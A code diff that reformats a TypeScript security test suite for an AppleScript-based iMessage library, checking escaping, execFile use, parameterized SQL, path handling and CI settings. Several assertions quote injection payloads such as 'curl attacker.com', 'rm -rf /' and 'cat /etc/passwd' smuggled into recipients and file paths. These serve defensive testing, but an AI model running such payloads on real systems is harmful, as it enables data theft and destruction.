@@ -12,10 +12,10 @@ import { describe, expect, test } from 'bun:test'
 import { readFileSync } from 'node:fs'
 import {
     escapeAppleScriptString,
-    generateSendTextScript,
-    generateSendTextToChat,
     generateSendAttachmentScript,
     generateSendAttachmentToChat,
+    generateSendTextScript,
+    generateSendTextToChat,
     generateSendWithAttachmentScript,
     generateSendWithAttachmentToChat,
 } from '../src/utils/applescript'
@@ -153,10 +153,7 @@ describe('Security: AppleScript Injection Prevention', () => {
         })
 
         test('should escape both recipient and text', () => {
-            const script = generateSendTextScript(
-                INJECTION_PAYLOADS.doubleQuote,
-                INJECTION_PAYLOADS.newlineShell
-            )
+            const script = generateSendTextScript(INJECTION_PAYLOADS.doubleQuote, INJECTION_PAYLOADS.newlineShell)
             expect(script).not.toContain('test"injection')
             expect(script).not.toContain('\n"; do shell script')
         })
@@ -183,19 +180,13 @@ describe('Security: AppleScript Injection Prevention', () => {
     // ------------------------------------------------------------
     describe('generateSendAttachmentScript', () => {
         test('should escape recipient with injection payload', () => {
-            const { script } = generateSendAttachmentScript(
-                INJECTION_PAYLOADS.combined2,
-                '/tmp/safe.jpg'
-            )
+            const { script } = generateSendAttachmentScript(INJECTION_PAYLOADS.combined2, '/tmp/safe.jpg')
             expect(script).not.toContain('bad"recipient')
             expect(script).not.toContain('do shell script "curl attacker.com"')
         })
 
         test('should escape file path with double quotes', () => {
-            const { script } = generateSendAttachmentScript(
-                'user@example.com',
-                INJECTION_PAYLOADS.combined1
-            )
+            const { script } = generateSendAttachmentScript('user@example.com', INJECTION_PAYLOADS.combined1)
             expect(script).not.toContain('evil"; rm -rf /')
             expect(script).toContain('evil\\"')
         })
@@ -211,10 +202,7 @@ describe('Security: AppleScript Injection Prevention', () => {
         })
 
         test('should escape file name in temp file name', () => {
-            const { script } = generateSendAttachmentScript(
-                'user',
-                '/tmp/bad"name.jpg'
-            )
+            const { script } = generateSendAttachmentScript('user', '/tmp/bad"name.jpg')
             // The temp file name should have escaped quotes
             expect(script).toContain('bad\\"name.jpg')
             expect(script).not.toContain('bad"name.jpg')
@@ -226,19 +214,13 @@ describe('Security: AppleScript Injection Prevention', () => {
     // ------------------------------------------------------------
     describe('generateSendAttachmentToChat', () => {
         test('should escape chatId with injection payload', () => {
-            const { script } = generateSendAttachmentToChat(
-                INJECTION_PAYLOADS.combined3,
-                '/tmp/safe.jpg'
-            )
+            const { script } = generateSendAttachmentToChat(INJECTION_PAYLOADS.combined3, '/tmp/safe.jpg')
             expect(script).not.toContain('chat"id"')
             expect(script).not.toContain('do shell script "cat /etc/passwd"')
         })
 
         test('should escape file path with injection payload', () => {
-            const { script } = generateSendAttachmentToChat(
-                'iMessage;-;+1234567890',
-                INJECTION_PAYLOADS.combined1
-            )
+            const { script } = generateSendAttachmentToChat('iMessage;-;+1234567890', INJECTION_PAYLOADS.combined1)
             expect(script).not.toContain('evil"; rm -rf /')
         })
     })
@@ -284,11 +266,7 @@ describe('Security: AppleScript Injection Prevention', () => {
     // ------------------------------------------------------------
     describe('generateSendWithAttachmentToChat', () => {
         test('should escape chatId in main script', () => {
-            const { script } = generateSendWithAttachmentToChat(
-                INJECTION_PAYLOADS.combined3,
-                'hello',
-                '/tmp/file.jpg'
-            )
+            const { script } = generateSendWithAttachmentToChat(INJECTION_PAYLOADS.combined3, 'hello', '/tmp/file.jpg')
             expect(script).not.toContain('chat"id"')
         })
 
@@ -343,10 +321,7 @@ describe('Security: AppleScript Injection Prevention', () => {
 // ------------------------------------------------------------
 describe('Security: Shell Command Injection Prevention', () => {
     test('download.ts should use execFile instead of exec', () => {
-        const downloadSource = readFileSync(
-            new URL('../src/utils/download.ts', import.meta.url),
-            'utf-8'
-        )
+        const downloadSource = readFileSync(new URL('../src/utils/download.ts', import.meta.url), 'utf-8')
 
         // Must use execFile (not exec with shell interpolation)
         expect(downloadSource).toContain('execFile')
@@ -362,10 +337,7 @@ describe('Security: Shell Command Injection Prevention', () => {
     })
 
     test('sips command should use array arguments', () => {
-        const downloadSource = readFileSync(
-            new URL('../src/utils/download.ts', import.meta.url),
-            'utf-8'
-        )
+        const downloadSource = readFileSync(new URL('../src/utils/download.ts', import.meta.url), 'utf-8')
 
         // Should use execFileAsync with array arguments
         expect(downloadSource).toMatch(/execFileAsync\s*\(\s*'sips'\s*,\s*\[/)
@@ -377,23 +349,17 @@ describe('Security: Shell Command Injection Prevention', () => {
 // ------------------------------------------------------------
 describe('Security: osascript Execution Safety', () => {
     test('execAppleScript should properly escape single quotes for shell', () => {
-        const source = readFileSync(
-            new URL('../src/utils/applescript.ts', import.meta.url),
-            'utf-8'
-        )
+        const source = readFileSync(new URL('../src/utils/applescript.ts', import.meta.url), 'utf-8')
 
         // Must use shell escaping for single quotes
-        expect(source).toContain("script.replace(/'/g, \"'\\\\''\")") 
+        expect(source).toContain("script.replace(/'/g, \"'\\\\''\")")
     })
 
     test('pgrep command should be hardcoded (no user input)', () => {
-        const source = readFileSync(
-            new URL('../src/utils/applescript.ts', import.meta.url),
-            'utf-8'
-        )
+        const source = readFileSync(new URL('../src/utils/applescript.ts', import.meta.url), 'utf-8')
 
         // pgrep should use hardcoded command, not user input
-        expect(source).toContain("pgrep -x Messages")
+        expect(source).toContain('pgrep -x Messages')
     })
 })
 
@@ -402,10 +368,7 @@ describe('Security: osascript Execution Safety', () => {
 // ------------------------------------------------------------
 describe('Security: SQL Injection Prevention', () => {
     test('database.ts should use parameterized queries', () => {
-        const source = readFileSync(
-            new URL('../src/core/database.ts', import.meta.url),
-            'utf-8'
-        )
+        const source = readFileSync(new URL('../src/core/database.ts', import.meta.url), 'utf-8')
 
         // Should use ? placeholders for parameters
         expect(source).toContain('params.push(')
@@ -436,11 +399,7 @@ describe('Security: No Dangerous Functions', () => {
     })
 
     test('should not use Function constructor for code execution', () => {
-        const files = [
-            '../src/utils/applescript.ts',
-            '../src/utils/download.ts',
-            '../src/core/sender.ts',
-        ]
+        const files = ['../src/utils/applescript.ts', '../src/utils/download.ts', '../src/core/sender.ts']
 
         for (const file of files) {
             const source = readFileSync(new URL(file, import.meta.url), 'utf-8')
@@ -454,10 +413,7 @@ describe('Security: No Dangerous Functions', () => {
 // ------------------------------------------------------------
 describe('Security: Source Code Audit', () => {
     test('applescript.ts should escape all user inputs in sandbox bypass scripts', () => {
-        const source = readFileSync(
-            new URL('../src/utils/applescript.ts', import.meta.url),
-            'utf-8'
-        )
+        const source = readFileSync(new URL('../src/utils/applescript.ts', import.meta.url), 'utf-8')
 
         // Verify escapeAppleScriptString is exported
         expect(source).toContain('export const escapeAppleScriptString')
@@ -473,16 +429,11 @@ describe('Security: Source Code Audit', () => {
     })
 
     test('no raw filePath in do shell script commands', () => {
-        const source = readFileSync(
-            new URL('../src/utils/applescript.ts', import.meta.url),
-            'utf-8'
-        )
+        const source = readFileSync(new URL('../src/utils/applescript.ts', import.meta.url), 'utf-8')
 
         // The pattern `"${filePath}"` should NOT appear in do shell script context
         // Instead, `"${escapedFilePath}"` should be used
-        const doShellScriptLines = source
-            .split('\n')
-            .filter(line => line.includes('do shell script'))
+        const doShellScriptLines = source.split('\n').filter((line) => line.includes('do shell script'))
 
         for (const line of doShellScriptLines) {
             expect(line).not.toContain('"${filePath}"')
@@ -491,15 +442,10 @@ describe('Security: Source Code Audit', () => {
     })
 
     test('no raw recipient in buddy commands', () => {
-        const source = readFileSync(
-            new URL('../src/utils/applescript.ts', import.meta.url),
-            'utf-8'
-        )
+        const source = readFileSync(new URL('../src/utils/applescript.ts', import.meta.url), 'utf-8')
 
         // Find all lines with `buddy "` pattern
-        const buddyLines = source
-            .split('\n')
-            .filter(line => line.includes('buddy "'))
+        const buddyLines = source.split('\n').filter((line) => line.includes('buddy "'))
 
         for (const line of buddyLines) {
             // Should use escapedRecipient, not raw recipient
@@ -514,34 +460,25 @@ describe('Security: Source Code Audit', () => {
 // ------------------------------------------------------------
 describe('Security: Path Traversal Prevention', () => {
     test('temp-file-manager should only delete files with specific prefix', () => {
-        const source = readFileSync(
-            new URL('../src/utils/temp-file-manager.ts', import.meta.url),
-            'utf-8'
-        )
+        const source = readFileSync(new URL('../src/utils/temp-file-manager.ts', import.meta.url), 'utf-8')
 
         // Must check file prefix before deletion
-        expect(source).toContain("startsWith(TEMP_FILE_PREFIX)")
+        expect(source).toContain('startsWith(TEMP_FILE_PREFIX)')
         expect(source).toContain("const TEMP_FILE_PREFIX = 'imsg_temp_'")
     })
 
     test('temp-file-manager should use join() for path construction', () => {
-        const source = readFileSync(
-            new URL('../src/utils/temp-file-manager.ts', import.meta.url),
-            'utf-8'
-        )
+        const source = readFileSync(new URL('../src/utils/temp-file-manager.ts', import.meta.url), 'utf-8')
 
         // Should use path.join() not string concatenation
-        expect(source).toContain("join(TEMP_DIR, file)")
+        expect(source).toContain('join(TEMP_DIR, file)')
     })
 
     test('download.ts should use join() for path construction', () => {
-        const source = readFileSync(
-            new URL('../src/utils/download.ts', import.meta.url),
-            'utf-8'
-        )
+        const source = readFileSync(new URL('../src/utils/download.ts', import.meta.url), 'utf-8')
 
         // Should use path.join() for temp file paths
-        expect(source).toContain("join(TEMP_DIR,")
+        expect(source).toContain('join(TEMP_DIR,')
     })
 })
 
@@ -550,10 +487,7 @@ describe('Security: Path Traversal Prevention', () => {
 // ------------------------------------------------------------
 describe('Security: ReDoS Prevention', () => {
     test('regex patterns should not be vulnerable to catastrophic backtracking', () => {
-        const source = readFileSync(
-            new URL('../src/types/advanced.ts', import.meta.url),
-            'utf-8'
-        )
+        const source = readFileSync(new URL('../src/types/advanced.ts', import.meta.url), 'utf-8')
 
         // Check that regex patterns don't have nested quantifiers
         // Patterns like (a+)+ or (a|a)+ are vulnerable
@@ -562,10 +496,7 @@ describe('Security: ReDoS Prevention', () => {
     })
 
     test('escapeAppleScriptString regex should be safe', () => {
-        const source = readFileSync(
-            new URL('../src/utils/applescript.ts', import.meta.url),
-            'utf-8'
-        )
+        const source = readFileSync(new URL('../src/utils/applescript.ts', import.meta.url), 'utf-8')
 
         // The escape regex should be a simple character class, not nested
         expect(source).toContain('/[\\\\\\n\\r\\t"]/g')
@@ -580,7 +511,7 @@ describe('Security: Null Byte Injection Prevention', () => {
         // Test that null bytes in file paths are handled
         const maliciousPath = '/tmp/file\x00.txt'
         const { script } = generateSendAttachmentScript('user', maliciousPath)
-        
+
         // The script should not break with null bytes
         expect(script).toBeDefined()
         expect(typeof script).toBe('string')
@@ -594,7 +525,7 @@ describe('Security: CRLF Injection Prevention', () => {
     test('should escape CR and LF characters', () => {
         const crlfPayload = 'test\r\ninjection'
         const escaped = escapeAppleScriptString(crlfPayload)
-        
+
         // Both CR and LF should be escaped
         expect(escaped).not.toContain('\r')
         expect(escaped).not.toContain('\n')
@@ -613,10 +544,7 @@ describe('Security: CRLF Injection Prevention', () => {
 // ------------------------------------------------------------
 describe('Security: Safe Randomness', () => {
     test('Math.random should only be used for non-security purposes', () => {
-        const source = readFileSync(
-            new URL('../src/utils/scheduler.ts', import.meta.url),
-            'utf-8'
-        )
+        const source = readFileSync(new URL('../src/utils/scheduler.ts', import.meta.url), 'utf-8')
 
         // Math.random is used for generating IDs, which is acceptable
         // but should not be used for security tokens
@@ -634,10 +562,7 @@ describe('Security: Safe Randomness', () => {
 // ------------------------------------------------------------
 describe('Security: Input Validation', () => {
     test('chatId validation should reject malicious input', () => {
-        const source = readFileSync(
-            new URL('../src/utils/common.ts', import.meta.url),
-            'utf-8'
-        )
+        const source = readFileSync(new URL('../src/utils/common.ts', import.meta.url), 'utf-8')
 
         // Should have validateChatId function
         expect(source).toContain('export function validateChatId')
@@ -645,10 +570,7 @@ describe('Security: Input Validation', () => {
     })
 
     test('recipient validation should exist', () => {
-        const source = readFileSync(
-            new URL('../src/types/advanced.ts', import.meta.url),
-            'utf-8'
-        )
+        const source = readFileSync(new URL('../src/types/advanced.ts', import.meta.url), 'utf-8')
 
         // Should validate recipient format
         expect(source).toContain('asRecipient')
@@ -656,16 +578,12 @@ describe('Security: Input Validation', () => {
     })
 })
 
-
 // ------------------------------------------------------------
 // Security: CI/CD Pipeline Audit
 // ------------------------------------------------------------
 describe('Security: CI/CD Pipeline Audit', () => {
     test('CI workflow should use pinned action versions', () => {
-        const ci = readFileSync(
-            new URL('../.github/workflows/ci.yml', import.meta.url),
-            'utf-8'
-        )
+        const ci = readFileSync(new URL('../.github/workflows/ci.yml', import.meta.url), 'utf-8')
 
         // Should use @v4 or specific versions, not @main or @master
         expect(ci).not.toContain('@main')
@@ -674,10 +592,7 @@ describe('Security: CI/CD Pipeline Audit', () => {
     })
 
     test('CI workflow should have security audit step', () => {
-        const ci = readFileSync(
-            new URL('../.github/workflows/ci.yml', import.meta.url),
-            'utf-8'
-        )
+        const ci = readFileSync(new URL('../.github/workflows/ci.yml', import.meta.url), 'utf-8')
 
         // Should run npm audit
         expect(ci).toContain('npm audit')
@@ -685,10 +600,7 @@ describe('Security: CI/CD Pipeline Audit', () => {
     })
 
     test('release workflow should use secrets properly', () => {
-        const release = readFileSync(
-            new URL('../.github/workflows/release.yml', import.meta.url),
-            'utf-8'
-        )
+        const release = readFileSync(new URL('../.github/workflows/release.yml', import.meta.url), 'utf-8')
 
         // Should use secrets, not hardcoded tokens
         expect(release).toContain('secrets.NPM_TOKEN')
@@ -721,10 +633,7 @@ describe('Security: Example Files Audit', () => {
     })
 
     test('auto-reply example should use ifFromOthers() to prevent loops', () => {
-        const autoReply = readFileSync(
-            new URL('../examples/08-auto-reply.ts', import.meta.url),
-            'utf-8'
-        )
+        const autoReply = readFileSync(new URL('../examples/08-auto-reply.ts', import.meta.url), 'utf-8')
 
         // Must use ifFromOthers() to prevent infinite loop
         expect(autoReply).toContain('ifFromOthers()')
